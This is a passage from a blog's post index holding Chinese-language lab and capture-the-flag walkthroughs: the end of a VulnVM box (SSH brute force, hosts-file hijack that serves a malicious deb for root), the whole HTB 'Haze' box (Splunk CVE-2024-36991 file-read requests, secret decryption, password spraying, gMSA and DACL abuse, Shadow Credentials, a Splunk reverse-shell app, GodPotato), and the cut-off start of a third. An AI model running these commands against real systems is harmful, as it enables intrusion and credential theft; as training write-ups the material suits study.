#\r[root@kali] /home/kali ❯ hydra -l support -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.136 -I -V 得到密码是liverpool\nRoot #\r查看sudo -l\nsupport@debian:~$ sudo -l\rMatching Defaults entries for support on debian:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser support may run the following commands on debian:\r(ALL) NOPASSWD: /usr/bin/check 并且这个文件不可读\nsupport@debian:~$ file /usr/bin/check\r/usr/bin/check: executable, regular file, no read permission\rsupport@debian:~$ ls -al /usr/bin/check\r-rwx--x--x 1 root root 548 Mar 27 17:17 /usr/bin/check 那就看看运行输出\nsupport@debian:~$ sudo /usr/bin/check\rReading package lists... Done\rBuilding dependency tree... Done\rReading state information... Done\rcurl is already the newest version (7.88.1-10+deb12u12).\r0 upgraded, 0 newly installed, 0 to remove and 64 not upgraded.\rReading package lists... Done\rBuilding dependency tree... Done\rReading state information... Done\rapache2 is already the newest version (2.4.62-1~deb12u2).\r0 upgraded, 0 newly installed, 0 to remove and 64 not upgraded.\rWarning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)).\rgpg: no valid OpenPGP data found.\r--2025-04-02 03:01:57-- https://pkg.jenkins.io/debian-stable/binary/jenkins_2.46.1_all.deb\rResolving pkg.jenkins.io (pkg.jenkins.io)... failed: Temporary failure in name resolution.\rwget: unable to resolve host address ‘pkg.jenkins.io’\rdpkg-deb: error: unexpected end of file in archive magic version number in /root/jenkins_2.46.1_all.deb\rdpkg: error processing archive /root/jenkins_2.46.1_all.deb (--install):\rdpkg-deb --control subprocess returned error exit status 2\rErrors were encountered while processing:\r/root/jenkins_2.46.1_all.deb 看起来他是要去pkg.jenkins.io这里下载一个deb包，然后安装。\n注意到**/etc/hosts**是可以写入的\n因此劫持域名\nsupport@debian:~$ cat /etc/hosts\r127.0.0.1 localhost\r127.0.1.1 debian\r# The following lines are desirable for IPv6 capable hosts\r::1 localhost ip6-localhost ip6-loopback\rff02::1 ip6-allnodes\rff02::2 ip6-allrouters\r192.168.56.118 pkg.jenkins.io 在本地开启一个https的服务，先生成证书，随意输入即可\n[root@kali] /home/kali/Search ❯ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes python脚本，注意端口要开在443\nimport http.server\rimport ssl\rPORT = 443 # 监听端口\rCERT_FILE = \u0026#34;server.pem\u0026#34; # 证书文件\r# 创建 HTTP 服务器\rserver_address = (\u0026#34;0.0.0.0\u0026#34;, PORT)\rhandler = http.server.SimpleHTTPRequestHandler\rhttpd = http.server.HTTPServer(server_address, handler)\r# 使用 SSLContext 代替 wrap_socket\rcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\rcontext.load_cert_chain(certfile=CERT_FILE)\r# 绑定 SSL\rhttpd.socket = context.wrap_socket(httpd.socket, server_side=True)\rprint(f\u0026#34;Serving HTTPS on port {PORT}...\u0026#34;)\rhttpd.serve_forever() dpkg | GTFOBins 根据要求生成恶意deb包之后，在https服务中注意目录结构\n开启服务后，运行check\n提权成功！可以看到check的内容就是远程下载deb，然后dpkg -i 安装。\nSummary #\rUser：网站注释中泄露用户名，尝试ssh登录爆破\nRoot：hosts劫持，下载恶意deb包得到root权限。\n","date":"2025-04-02","externalUrl":null,"permalink":"/posts/2025/04/vulnvm-search/","section":"Posts","summary":"","title":"VulnVM-Search","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Hard Nmap #\r[root@kali] /home/kali ❯ nmap Haze.htb -sV -A PORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)\r| ssl-cert: Subject: commonName=dc01.haze.htb\r| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:dc01.haze.htb\r| Not valid before: 2025-03-05T07:12:20\r|_Not valid after: 2026-03-05T07:12:20\r|_ssl-date: TLS randomness does not represent time\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)\r| ssl-cert: Subject: commonName=dc01.haze.htb\r| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:dc01.haze.htb\r| Not valid before: 2025-03-05T07:12:20\r|_Not valid after: 2026-03-05T07:12:20\r|_ssl-date: TLS randomness does not represent time\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)\r|_ssl-date: TLS randomness does not represent time\r| ssl-cert: Subject: commonName=dc01.haze.htb\r| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:dc01.haze.htb\r| Not valid before: 2025-03-05T07:12:20\r|_Not valid after: 2026-03-05T07:12:20\r3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)\r|_ssl-date: TLS randomness does not represent time\r| ssl-cert: Subject: commonName=dc01.haze.htb\r| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:dc01.haze.htb\r| Not valid before: 2025-03-05T07:12:20\r|_Not valid after: 2026-03-05T07:12:20\r8000/tcp open http Splunkd httpd\r| http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8).\r|_Requested resource was http://Haze.htb:8000/en-US/account/login?return_to=%2Fen-US%2F\r|_http-server-header: Splunkd\r| http-robots.txt: 1 disallowed entry |_/\r8088/tcp open ssl/http Splunkd httpd\r|_http-server-header: Splunkd\r|_http-title: 404 Not Found\r| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser\r| Not valid before: 2025-03-05T07:29:08\r|_Not valid after: 2028-03-04T07:29:08\r| http-robots.txt: 1 disallowed entry |_/\r8089/tcp open ssl/http Splunkd httpd\r|_http-title: splunkd\r| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser\r| Not valid before: 2025-03-05T07:29:08\r|_Not valid after: 2028-03-04T07:29:08\r| http-robots.txt: 1 disallowed entry |_/\r|_http-server-header: Splunkd dc01.haze.htb添加到**/etc/hosts**\nCVE-2024-36991 #\r在8089端口上能看到服务版本\n[root@kali] /home/kali/Haze/CVE-2024-36991 (main) ❯ python CVE-2024-36991.py -u http://haze.htb:8000/ ______ _______ ____ ___ ____ _ _ _____ __ ___ ___ _ / ___\\ \\ / | ____| |___ \\ / _ |___ \\| || | |___ / / /_ / _ \\ / _ \\/ | | | \\ \\ / /| _| _____ __) | | | |__) | || |_ _____ |_ \\| \u0026#39;_ | (_) | (_) | | | |___ \\ V / | |__|_____/ __/| |_| / __/|__ _|________) | (_) \\__, |\\__, | | \\____| \\_/ |_____| |_____|\\___|_____| |_| |____/ \\___/ /_/ /_/|_| -\u0026gt; POC CVE-2024-36991. This exploit will attempt to read Splunk /etc/passwd file. -\u0026gt; By x.com/MohamedNab1l\r-\u0026gt; Use Wisely.\r[INFO] Log directory created: logs\r[INFO] Testing single target: http://haze.htb:8000/\r[VLUN] Vulnerable: http://haze.htb:8000/\r:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152\r:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152\r:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152\r:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152 找到可能存在的用户\nEdward@haze.htb\rMark@haze.htb\rpaul@haze.htb 但是密码哈希无法被破解\nCritical Splunk Vulnerability CVE-2024-36991: Patch Now to Prevent Arbitrary File Reads 看到能成功读取文件\n因此可以尝试读取Splunk的配置文件，可以看到默认的安装目录是\nC:\\Program Files\\Splunk Splunk目录结构及常用配置文件_如何查看splunk的家目录-CSDN博客\nList of configuration files - Splunk Documentation\n可以查看到authentication.conf的内容\nGET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/system/local/authentication.conf HTTP/1.1\rHost: haze.htb:8000\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate, br\rConnection: keep-alive\rUpgrade-Insecure-Requests: 1\rPriority: u=0, i\r---------------------\r[splunk_auth]\rminPasswordLength = 8\rminPasswordUppercase = 0\rminPasswordLowercase = 0\rminPasswordSpecial = 0\rminPasswordDigit = 0\r[Haze LDAP Auth]\rSSLEnabled = 0\ranonymous_referrals = 1\rbindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb\rbindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=\rcharset = utf8\remailAttribute = mail\renableRangeRetrieval = 0\rgroupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb\rgroupMappingAttribute = dn\rgroupMemberAttribute = member\rgroupNameAttribute = cn\rhost = dc01.haze.htb\rnestedGroups = 0\rnetwork_timeout = 20\rpagelimit = -1\rport = 389\rrealNameAttribute = cn\rsizelimit = 1000\rtimelimit = 15\ruserBaseDN = CN=Users,DC=haze,DC=htb\ruserNameAttribute = samaccountname\r[authentication]\rauthSettings = Haze LDAP Auth\rauthType = LDAP 尝试对密码进行解密\nHurricaneLabs/splunksecrets: splunksecrets is a tool for working with Splunk secrets offline 需要splunk.secret参数\nGET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/auth/splunk.secret HTTP/1.1\rHost: haze.htb:8000\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate, br\rConnection: keep-alive\rUpgrade-Insecure-Requests: 1\rPriority: u=0, i\r---------\rNfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD 得到密码\n可以看到密码是正确的\n目标机器开启了5985端口，但是这个账户登录不上去\nUserEnum #\r查看其他用户\n[root@kali] /home/kali/Haze ❯ crackmapexec smb haze.htb -u \u0026#39;paul.taylor\u0026#39; -p \u0026#39;Ld@p_Authxxxxxxxxxx\u0026#39; --rid-brute | grep \u0026#39;SidTypeUser\u0026#39; ⏎\rSMB Haze.htb 445 DC01 500: HAZE\\Administrator (SidTypeUser)\rSMB Haze.htb 445 DC01 501: HAZE\\Guest (SidTypeUser)\rSMB Haze.htb 445 DC01 502: HAZE\\krbtgt (SidTypeUser)\rSMB Haze.htb 445 DC01 1000: HAZE\\DC01$ (SidTypeUser)\rSMB Haze.htb 445 DC01 1103: HAZE\\paul.taylor (SidTypeUser)\rSMB Haze.htb 445 DC01 1104: HAZE\\mark.adams (SidTypeUser)\rSMB Haze.htb 445 DC01 1105: HAZE\\edward.martin (SidTypeUser)\rSMB Haze.htb 445 DC01 1106: HAZE\\alexander.green (SidTypeUser)\rSMB Haze.htb 445 DC01 1111: HAZE\\Haze-IT-Backup$ (SidTypeUser) 可以看到还有其他几个用户\nmark.adams\redward.martin\ralexander.green\rHaze-IT-Backup$ 尝试进行密码喷洒，确实存在密码复用的问题。\n[root@kali] /home/kali/Haze ❯ crackmapexec smb haze.htb -u usernames.txt -p \u0026#39;Ld@p_Authxxxxxxxxxx\u0026#39; ⏎\rSMB Haze.htb 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)\rSMB Haze.htb 445 DC01 [+] haze.htb\\mark.adams:Ld@p_Authxxxxxxxxxx Bloodhound-1 #\r[root@kali] /home/kali/Haze ❯ bloodhound-python -u \u0026#39;mark.adams\u0026#39; -p \u0026#39;Ld@p_Authxxxxxxxxxx\u0026#39; -d haze.htb -dc dc01.haze.htb -ns 10.10.xx.xx -c all --zip INFO: Found AD domain: haze.htb\rINFO: Getting TGT for user\rINFO: Connecting to LDAP server: dc01.haze.htb\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: dc01.haze.htb\rINFO: Found 8 users\rINFO: Found 57 groups\rINFO: Found 2 gpos\rINFO: Found 2 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: dc01.haze.htb\rINFO: Done in 00M 50S 发现mark属于一个GMSA（Group Managed Service Accounts ）的管理员组\n​作为gMSA 管理员组的成员，您拥有检索和管理组托管服务账户（gMSA）密码的权限。​如果您希望了解如何利用此权限进行攻击，以下是可能的途径：\n直接读取 gMSA 密码： gMSA 的密码存储在 Active Directory 的 msDS-ManagedPassword 属性中，只有被授权的账户（如 gMSA 管理员组成员）才能访问。作为管理员组成员，您可以直接检索并解密该属性，获取明文密码。这使您能够以 gMSA 的身份登录或执行操作，可能获得更高的系统权限。\nNTLM 中继攻击： 利用 NTLM 协议的漏洞，攻击者可以将 NTLM 身份验证请求中继到 LDAP 或 LDAPS 服务，进而访问 msDS-ManagedPassword 属性，获取 gMSA 密码。然而，此方法需要特定的网络条件和配置，且成功率受限。\n黄金 gMSA 攻击： 如果攻击者能够访问密钥分发服务（KDS）根密钥属性，他们可以离线生成所有关联 gMSA 的密码。这被称为“黄金 gMSA”攻击，允许攻击者在不触发密码更改或访问日志的情况下，持续获取 gMSA 的密码。\nReadGMSAPassword #\r尝试进行读取密码：ReadGMSAPassword | The Hacker Recipes\n[root@kali] /home/kali/Haze/gMSADumper (main) ❯ python gMSADumper.py -u \u0026#39;mark.adams\u0026#39; -p \u0026#39;Ld@p_Autxxxxxxxxxxx\u0026#39; -d haze.htb\rUsers or groups who can read password for Haze-IT-Backup$:\r\u0026gt; Domain Admins 可以看到当前mark没有这个权限，不过mark属于管理员组，可以给自己加权限。\n注意gMSA并不是一个组，而是一种特殊的账户类型！！所以在bloodhound里查看不到\n可以用下面的命令检查 **Haze-IT-Backup$**的账户类型\n*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents\u0026gt; Get-ADServiceAccount -Identity Haze-IT-Backup$ | Select-Object Name, ObjectClass\rName ObjectClass\r---- -----------\rHaze-IT-Backup msDS-GroupManagedServiceAccount 谁有权限查看他的密码，确实只有Domain Admins\n*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents\u0026gt; Get-ADServiceAccount -Identity \u0026#34;Haze-IT-Backup$\u0026#34; -Properties PrincipalsAllowedToRetrieveManagedPassword\rDistinguishedName : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb\rEnabled : True\rName : Haze-IT-Backup\rObjectClass : msDS-GroupManagedServiceAccount\rObjectGUID : 66f8d593-2f0b-4a56-95b4-01b326c7a780\rPrincipalsAllowedToRetrieveManagedPassword : {CN=Domain Admins,CN=Users,DC=haze,DC=htb}\rSamAccountName : Haze-IT-Backup$\rSID : S-1-5-21-323145914-28650650-2368316563-1111\rUserPrincipalName : 毕竟mark是gMSA管理员组的，尝试修改一下可读用户呢\n*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents\u0026gt; Set-ADServiceAccount -Identity \u0026#34;Haze-IT-Backup$\u0026#34; -PrincipalsAllowedToRetrieveManagedPassword \u0026#34;mark.adams\u0026#34;\r*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents\u0026gt; Get-ADServiceAccount -Identity \u0026#34;Haze-IT-Backup$\u0026#34; -Properties PrincipalsAllowedToRetrieveManagedPassword\rDistinguishedName : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb\rEnabled : True\rName : Haze-IT-Backup\rObjectClass : msDS-GroupManagedServiceAccount\rObjectGUID : 66f8d593-2f0b-4a56-95b4-01b326c7a780\rPrincipalsAllowedToRetrieveManagedPassword : {CN=Mark Adams,CN=Users,DC=haze,DC=htb}\rSamAccountName : Haze-IT-Backup$\rSID : S-1-5-21-323145914-28650650-2368316563-1111\rUserPrincipalName : 然后再去读取，可以发现成功。这里应该是有一个定时任务，因为过一会这个用户又无法读取了\n尽管拿到了哈希值，但是无法通过5985端口连上去\n为了验证mark.adam确实是有写入权限的，可以执行以下命令，查看Backup的访问控制表\n*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents\u0026gt; dsacls \u0026#34;CN=HAZE-IT-BACKUP,CN=MANAGED SERVICE ACCOUNTS,DC=HAZE,DC=HTB\u0026#34; ms-DS-GroupMSAMembership attribute - Win32 apps | Microsoft Learn msDS-GroupMSAMembership 是 Active Directory (AD) 中 管理服务账户（gMSA） 相关的一个属性。它用于 存储可以检索 gMSA 密码的组，即 允许哪些组或对象读取 该 组管理服务账户（gMSA） 的密码。\n由于mark是gMSA_Managers组的，因此可以修改这个值，从而获取到Backup的密码哈希。\nBloodHound-2 #\r注意！！！！！！！\n如果使用的是mark.adams进行域内搜集的话，会因为权限的问题造成部分信息缺失。\n那么最好的习惯就是，拿到一个域内用户就尝试更新bloodhound的内容。\n[root@kali] /home/kali/Haze ❯ bloodhound-python -u \u0026#39;Haze-IT-Backup$\u0026#39; --hashes \u0026#39;:735c02cXXXXXXXXXXXXXXXXXXX\u0026#39; -d haze.htb -dc dc01.haze.htb -ns 10.xx.xx.xx -c all --zip\rINFO: Found AD domain: haze.htb\rINFO: Getting TGT for user\rINFO: Connecting to LDAP server: dc01.haze.htb\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: dc01.haze.htb\rINFO: Found 9 users\rINFO: Found 57 groups\rINFO: Found 2 gpos\rINFO: Found 2 ous\rINFO: Found 20 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: dc01.haze.htb\rINFO: Done in 01M 07S 可以看到BACKUP用户可以修改SUPPORT组的拥有者，而SUPPORT组可以修改EDWARD的密码和进行Shadow Credential攻击\n接下来先将Backup设置为组拥有者\n[root@kali] /home/kali/Haze ❯ bloodyAD --host \u0026#34;10.xxx.xxx.xxx\u0026#34; -d \u0026#34;haze.htb\u0026#34; -u \u0026#34;Haze-IT-Backup$\u0026#34; -p \u0026#34;:735c0xxxxxxxxxxxxxxxxxxxx\u0026#34; set owner SUPPORT_SERVICES Haze-IT-Backup$\r[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on SUPPORT_SERVICES 给自己加上全部权限\n[root@kali] /home/kali/Haze ❯ impacket-dacledit -action write -rights FullControl -principal \u0026#39;Haze-IT-Backup$\u0026#39; -target-dn \u0026#39;CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB\u0026#39; -dc-ip 10.xx.xx.xx\u0026#34;haze.htb/Haze-IT-Backup$\u0026#34; -hashes \u0026#39;:735c02c6xxxxxxxxxxxxxxxxxxx\u0026#39;\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] DACL backed up [*] DACL modified successfully! 还要把自己加到组里面去\n[root@kali] /home/kali/Haze/pywhisker/pywhisker (main) ⚡ ❯ bloodyAD --host \u0026#34;10.xx.xx.xx\u0026#34; -d \u0026#34;haze.htb\u0026#34; -u \u0026#34;Haze-IT-Backup$\u0026#34; -p \u0026#34;:735c0XXXXXXXXXXXXXXXXXXXXXXXX\u0026#34; add groupMember SUPPORT_SERVICES Haze-IT-Backup$\r[+] Haze-IT-Backup$ added to SUPPORT_SERVICES Shadow Credential #\rShutdownRepo/pywhisker: Python version of the C# tool for \u0026ldquo;Shadow Credentials\u0026rdquo; attacks [root@kali] /home/kali/Haze/pywhisker/pywhisker (main) ⚡ ❯ python pywhisker.py -d \u0026#34;haze.htb\u0026#34; -u \u0026#34;Haze-IT-Backup$\u0026#34; -H \u0026#39;735c0XXXXXXXXXXXXXXXXXXXX\u0026#39; --target edward.martin --action add\r[*] Searching for the target account\r[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb\r[*] Generating certificate\r[*] Certificate generated\r[*] Generating KeyCredential\r[*] KeyCredential generated with DeviceID: ad2dab15-1705-97ae-2a31-3e7dc76e9ae0\r[*] Updating the msDS-KeyCredentialLink attribute of edward.martin\r[+] Updated the msDS-KeyCredentialLink attribute of the target object\r[*] Converting PEM -\u0026gt; PFX with cryptography: c00sSu5E.pfx\r[+] PFX exportiert nach: c00sSu5E.pfx\r[i] Passwort für PFX: nppJ5hulBJapp4MbWmei\r[+] Saved PFX (#PKCS12) certificate \u0026amp; key at path: c00sSu5E.pfx\r[*] Must be used with password: nppJ5hulBJapp4MbWmei\r[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools 使用他提供的工具👇\ndirkjanm/PKINITtools: Tools for Kerberos PKINIT and relaying to AD CS 使用刚才生成的证书来请求一个TGT，这里的参数在上面提供了\n[root@kali] /home/kali/Haze/pywhisker/pywhisker/PKINITtools (master) ❯ python gettgtpkinit.py -cert-pfx ../c00sSu5E.pfx -pfx-pass nppJ5hulBJapp4MbWmei haze.htb/edward.martin edward.ccache 设置环境变量\n[root@kali] /home/kali/Haze/pywhisker/pywhisker/PKINITtools (master) ❯ export KRB5CCNAME=/home/kali/Haze/pywhisker/pywhisker/PKINITtools/edward.ccache 然后请求nthash\n[root@kali] /home/kali/Haze/pywhisker/pywhisker/PKINITtools (master) ❯ python getnthash.py -key d0fe683700624e9392a976017afd89838fa7c4035c5889474a92cbdda68554b9 haze.htb/edward.martin\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Using TGT from cache\r[*] Requesting ticket to self with PAC\rRecovered NT Hash\r09e0b3eeb2xxxxxxxxxxxxxxxxxxxxxx 最后登录上去拿到User\nPrivilege Escalation #\r注意到根目录下有个Backup目录，这个目录我们之前是无法进入的\n下载下来之后，就是网站的备份源码，里面和实际网站内容有差别的。\n这里直接查找类似密码的字符串，根据splunk的密码格式查找\n[root@kali] /home/kali/Haze/splunk/Splunk ❯ grep -rI \u0026#39;\\$1\\$\u0026#39; .\r./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with \u0026#34;$1$\u0026#34;. This is used by\r./etc/system/README/server.conf.spec: * NOTE: Unencrypted passwords must not begin with \u0026#34;$1$\u0026#34;, because this is\r./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with \u0026#34;$1$\u0026#34;, as Splunk software uses\r./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with \u0026#34;$1$\u0026#34;, as this is used by\r./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with \u0026#34;$1$\u0026#34;, as this is used by\r./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with \u0026#34;$1$\u0026#34;, as this is used by\r./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with \u0026#34;$1$\u0026#34;, as this is used by\r./etc/system/README/indexes.conf.spec:* Unencrypted access key cannot begin with \u0026#34;$1$\u0026#34; or \u0026#34;$7$\u0026#34;. These prefixes are reserved\r./etc/system/README/indexes.conf.spec:* Unencrypted secret key cannot begin with \u0026#34;$1$\u0026#34; or \u0026#34;$7$\u0026#34;. These prefixes are reserved\r./etc/system/README/outputs.conf.example:token=$1$/fRSBT+2APNAyCB7tlcgOyLnAtqAQFC8NI4TGA2wX4JHfN5d9g==\r./var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf:bindDNpassword = $1$YDz8WfXXXXXXXXXXXX\r./lib/node_modules/pdfkit/lib/mixins/color.coffee: color = color.replace(/#([0-9A-F])([0-9A-F])([0-9A-F])/i, \u0026#34;#$1$1$2$2$3$3\u0026#34;) if color.length is 4 然后用splunksecrets进行解密，注意这里的secret是备份代码中的。\n[root@kali] /home/kali/Haze ❯ splunksecrets splunk-decrypt -S splunk/Splunk/etc/auth/splunk.secret ⏎\rCiphertext: $1$YDz8WfhXXXXXXXXXXXXXXX\rSp1unkXXXXXXXXXX 使用用户名admin即可登录到后台\n0xjpuff/reverse_shell_splunk: A simple splunk package for obtaining reverse shells on both Windows and most *nix systems. 根据说明修改ip和端口后上传，得到反弹shell\n查看当前用户的权限信息\nPS C:\\Windows\\system32\u0026gt; whoami /all\rUSER INFORMATION\r----------------\rUser Name SID ==================== ===========================================\rhaze\\alexander.green S-1-5-21-323145914-28650650-2368316563-1106\rGROUP INFORMATION\r-----------------\rGroup Name Type SID Attributes ========================================== ================ =========================================== ==================================================\rEveryone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group\rBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\rBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\rBUILTIN\\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled group\rCONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group\rLOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group\rHAZE\\Splunk_Admins Group S-1-5-21-323145914-28650650-2368316563-1108 Mandatory group, Enabled by default, Enabled group\rAuthentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group\rMandatory Label\\High Mandatory Level Label S-1-16-12288 PRIVILEGES INFORMATION\r----------------------\rPrivilege Name Description State ============================= ========================================= ========\rSeMachineAccountPrivilege Add workstations to domain Disabled\rSeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled\rUSER CLAIMS INFORMATION\r-----------------------\rUser claims unknown. SeImpersonatePrivilege 是 Windows 系统中的一种权限，赋予进程 “模拟（Impersonation）” 的能力。\n拥有该权限的进程可以在获得某个令牌（Token）句柄后，模拟该令牌对应的用户身份，但无法直接创建新的令牌。\n可以在这里查找到这个组的利用👇\nAbusing Tokens - HackTricks ./GodPotato-NET4.exe -cmd \u0026#39;cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt\u0026#39; 可以看到成功读取，当然其他的一些Potato也能这样执行\n除了这个方式，也可以通过meterpreter\n拿到哈希之后通过5985登录拿到Administrator的shell\nSummary #\rUser：任意文件读取拿到密码以及密钥secret，通过工具解密得到pual和mark共用的密码。mark是GMSA组的管理员，因此可以尝试读取到Backup用户的密码哈希。拿到Backup之后再次进行域内分析，可以进行ShadowCredential攻击，最后拿到user。\nRoot：通过下载备份源码分析，得到admin用户的登录密码，到后台上传一个恶意的插件。得到Alexander用户，这个用户在SeImpersonatePrivilege组中，可以进行提权操作。\n","date":"2025-03-31","externalUrl":null,"permalink":"/posts/2025/03/htb-haze/","section":"Posts","summary":"","title":"HTB-Haze","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali ❯ nmap 192.168.56.131 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2 (protocol 2.0)\r| ssh-hostkey: | 256 f6:91:6b:ad:ea:ad:1d:b9:44:09:d8:74:a3:02:38:35 (ECDSA)\r|_ 256 b6:66:2f:f0:4c:26:7f:7d:14:ea:b3:62:09:64:a7:94 (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-title: Apache2 Ubuntu Default Page: It works\r|_http-server-header: Apache/2.4.62 (Debian) 进入80端口查看，是一个apache默认页\nGobuster #\r进行目录扫描，没有扫到任何东西\n[root@kali] /home/kali ❯ gobuster dir -u http://192.168.56.131/ -w 